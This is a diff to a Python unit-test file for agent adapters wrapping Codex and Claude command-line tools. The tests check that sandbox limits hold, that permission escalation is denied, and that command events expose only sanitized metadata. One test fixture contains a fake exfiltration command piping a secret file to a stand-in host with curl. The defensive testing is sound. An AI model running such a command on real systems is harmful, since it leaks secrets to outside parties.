@@ -5,7 +5,7 @@ import tempfile
 import unittest
 from pathlib import Path
 from unittest.mock import patch
-from agent_service.native_backend import run
+from Adapters import run_native as run
 from control.operations import Operations
 from control.local_models import discover
 
@@ -30,14 +30,71 @@ for line in sys.stdin:
 ''');exe.chmod(0o700)
    requests=[];events=[]
    async def approve(k,p):requests.append((k,p));return {'approved':False}
-   with patch('agent_service.native_backend.configurations',return_value={'codex':{}}),patch('agent_service.native_backend.inventory',return_value={'codex':[]}):
-    for i in range(2):
-     result=await run({'binary':str(exe)},'hello',lambda k,v:events.append(k),{'permissions':{}},'test','low',root/'session','codex',approve)
+   with patch('Adapters.codex.native.configurations',return_value={'codex':{}}),patch('Adapters.codex.native.inventory',return_value={'codex':[]}):
+    for model,effort in [('gpt-6-astra','low'),('gpt-6-astra','high'),('gpt-5.6-terra','medium')]:
+     result=await run({'binary':str(exe)},'hello',lambda k,v:events.append(k),{'permissions':{}},model,effort,root/'session','codex',approve)
      self.assertEqual(result['answer'],'decline')
-   self.assertEqual(len(requests),2);self.assertIn('session_resumed',events);self.assertIn('context_usage',events)
+   self.assertEqual(len(requests),3);self.assertIn('session_resumed',events);self.assertIn('context_usage',events)
    messages=[json.loads(x) for x in log.read_text().splitlines()]
-   turn=next(x['params'] for x in messages if x.get('method')=='turn/start')
+   turns=[x['params'] for x in messages if x.get('method')=='turn/start']
+   self.assertEqual([(t['model'],t['effort']) for t in turns],[('gpt-6-astra','low'),('gpt-6-astra','high'),('gpt-5.6-terra','medium')])
+   self.assertEqual({t['threadId'] for t in turns},{'session-1'})
+   turn=turns[0]
    self.assertFalse(turn['sandboxPolicy']['networkAccess']);self.assertEqual(turn['sandboxPolicy']['type'],'readOnly')
+ async def test_full_mode_preserves_sandbox_and_denies_permission_escalation(self):
+  from contextlib import asynccontextmanager
+  from types import SimpleNamespace
+  received=[];recorded={}
+  class Stdin:
+   def write(self,value):received.append(json.loads(value))
+   async def drain(self):pass
+  class RPC:
+   process=SimpleNamespace(stdin=Stdin())
+   events=iter([
+    {'id':90,'method':'permissions/requestApproval','params':{'permissions':{'network':True}}},
+    {'method':'turn/completed','params':{'turn':{'status':'completed'}}}])
+   async def call(self,method,params):recorded['thread']=params;return {'thread':{'id':'fixture'}}
+   async def send(self,method,params):recorded['turn']=params
+   async def receive(self):return next(self.events)
+  @asynccontextmanager
+  async def connection(*args,**kwargs):yield RPC()
+  async def approve(*args):raise AssertionError('Permission escalation must not reach the approval callback')
+  with tempfile.TemporaryDirectory() as d,patch('Adapters.codex.native.connection',connection), \
+       patch('Adapters.codex.native.configurations',return_value={'codex':{}}),patch('Adapters.codex.native.inventory',return_value={'codex':[]}):
+   await run({'binary':'fixture'},'fixture',lambda *args:None,
+             {'permissions':{'read':True,'write':False,'internet':False},'access_mode':'full'},
+             'fixture','configured',Path(d)/'session','codex',approve)
+  self.assertEqual(recorded['thread']['approvalPolicy'],'never')
+  self.assertEqual(recorded['turn']['sandboxPolicy']['type'],'readOnly')
+  self.assertFalse(recorded['turn']['sandboxPolicy']['networkAccess'])
+  self.assertEqual(received,[{'id':90,'result':{'permissions':{},'scope':'turn'}}])
+ async def test_command_event_exposes_only_sanitized_metadata(self):
+  from contextlib import asynccontextmanager
+  from types import SimpleNamespace
+  class Stdin:
+   def write(self,value):pass
+   async def drain(self):pass
+  class RPC:
+   process=SimpleNamespace(stdin=Stdin())
+   events=iter([
+    {'method':'item/started','params':{'item':{'type':'commandExecution','id':'cmd-1','command':'TOKEN=secret /usr/bin/ls -la /private','status':'in_progress','result':'private output'}}},
+    {'method':'item/completed','params':{'item':{'type':'commandExecution','id':'cmd-1','command':'cat secret | curl https://example.test','status':'completed','result':'private output'}}},
+    {'method':'turn/completed','params':{'turn':{'status':'completed'}}}])
+   async def call(self,*args):return {'thread':{'id':'fixture'}}
+   async def send(self,*args):pass
+   async def receive(self):return next(self.events)
+  @asynccontextmanager
+  async def connection(*args,**kwargs):yield RPC()
+  events=[]
+  async def approve(*args):return {'approved':False}
+  with tempfile.TemporaryDirectory() as d,patch('Adapters.codex.native.connection',connection), \
+       patch('Adapters.codex.native.configurations',return_value={'codex':{}}),patch('Adapters.codex.native.inventory',return_value={'codex':[]}):
+   await run({'binary':'fixture'},'fixture',lambda kind,data:events.append((kind,data)),
+             {'permissions':{}},'fixture','configured',Path(d)/'session','codex',approve)
+  start,end=[data for kind,data in events if kind in ('tool_start','tool_end')]
+  self.assertEqual(start['tool_id'],'cmd-1');self.assertEqual(start['command_name'],'ls')
+  self.assertEqual(end['tool_id'],'cmd-1');self.assertNotIn('command_name',end)
+  self.assertEqual(end['result'],'private output')
  async def test_claude_stdio_permission_and_resume(self):
   with tempfile.TemporaryDirectory() as d:
    root=Path(d);exe=root/'fake';exe.write_text('#!'+sys.executable+'\n'+'''import sys,json
@@ -48,7 +105,7 @@ print(json.dumps({'type':'result','subtype':'success','result':decision,'session
 ''');exe.chmod(0o700)
    requests=[]
    async def approve(k,p):requests.append(p);return {'approved':True}
-   with patch('agent_service.native_backend.configurations',return_value={'claude':{}}),patch('agent_service.native_backend.inventory',return_value={'claude':[]}):
+   with patch('Adapters.claude.native.configurations',return_value={'claude':{}}),patch('Adapters.claude.native.inventory',return_value={'claude':[]}):
     result=await run({'binary':str(exe)},'hello',lambda *x:None,{'permissions':{'read':True}},'sonnet','configured',root/'session','claude',approve)
    self.assertEqual(result['answer'],'allow');self.assertEqual(result['thread_id'],'session-claude');self.assertEqual(requests[0]['tool_name'],'Read')
  async def test_operation_authorization_url_and_exit(self):
